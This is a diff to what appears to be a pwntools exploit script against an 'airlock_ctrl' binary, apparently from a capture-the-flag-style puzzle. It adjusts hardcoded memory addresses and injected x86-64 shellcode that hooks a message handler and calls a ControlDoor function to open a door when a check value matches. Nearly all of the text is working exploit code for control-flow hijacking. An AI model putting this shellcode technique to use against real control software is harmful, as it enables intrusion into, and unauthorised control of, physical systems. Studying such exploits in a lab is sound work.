@@ -8,11 +8,11 @@ EXE_PATH = '/home/jdiamond/src/fatal_core_dump/bin/airlock_ctrl'
 context.binary = EXE_PATH
 
 # HandleSetSuitOccupant
-ORIGINAL_FUNCTION_ADDRESS = 0x555555555de2
+ORIGINAL_FUNCTION_ADDRESS = 0x555555555e7e
 # ControlDoor
 INJECT_FUNCTION_ADDRESS = 0x555555555269
-# rx_message_buffer
-BUFFER_STACK_ADDRESS = 0x7fffffffe8b0
+# message_serialization_buffer
+BUFFER_STACK_ADDRESS = 0x7fffffffe8a8
 # message_handlers
 HANDLERS_ADDRESS = 0x55555555a7c0
 
@@ -42,23 +42,24 @@ sh = asm(f'''
     push    rbp
     mov     rbp,rsp
     movabs  rax, {ORIGINAL_FUNCTION_ADDRESS}
-    mov     rdx, rdi
-    add     rdx, {CHECK_VALUE_OFFSET}
-    cmp     DWORD PTR [rdx], {CHECK_VALUE}
+    mov     rbx, rdi
+    add     rbx, {CHECK_VALUE_OFFSET}
+    cmp     DWORD PTR [rbx], {CHECK_VALUE}
     jne     .L_skip
-    push    rax
-    movabs  rax, {INJECT_FUNCTION_ADDRESS}
     push    rdi
     push    rsi
+    push    rdx
+    push    rax
+    movabs  rax, {INJECT_FUNCTION_ADDRESS}
     mov     edi, {DEVICE_ID}
     mov     esi, {DOOR_DEVICE_ID}
     mov     edx, 1
     call    rax
     pop     rax
     mov     qword ptr [{CALLBACK_HEAP_ADDRESS}], rax
+    pop     rdx
     pop     rsi
     pop     rdi
-    nop
     nop
     nop
 .L_skip:
